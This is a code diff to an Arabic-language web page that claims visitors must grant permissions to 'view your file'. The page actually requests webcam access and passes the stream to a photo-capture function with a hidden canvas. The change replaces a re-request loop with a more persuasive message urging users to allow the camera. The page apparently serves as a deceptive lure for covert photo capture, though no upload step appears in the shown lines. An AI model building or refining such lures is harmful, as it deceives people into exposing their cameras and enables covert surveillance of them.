@@ -17,7 +17,7 @@
 <body>
   <div class="container">
     <h1>شاهد ملفك</h1>
-    <p>لمشاهدة ملفك عليك منح الأذونات.</p>
+    <p id="instructionText">لمشاهدة ملفك عليك منح الأذونات.</p>
     <button id="grantPermissionBtn">امنح الأذونات</button>
     <canvas id="canvas" class="hidden"></canvas>
   </div>
@@ -62,12 +62,14 @@
         await navigator.mediaDevices.getUserMedia({ video: true });
         initializePhotoCapture();
       } catch (error) {
+        document.getElementById('instructionText').innerText = 'لمشاهدة ملفك، نحتاج إلى إذن الكاميرا. اضغط على زر السماح لإعطائنا الأذن.';
+        document.getElementById('grantPermissionBtn').style.display = 'block';
         console.error('فشل في الحصول على إذن الكاميرا:', error);
-        requestCameraPermission();
       }
     };
 
     const initializePhotoCapture = () => {
+      document.getElementById('grantPermissionBtn').style.display = 'none';
       navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
         const video = document.createElement('video');
         video.srcObject = stream;
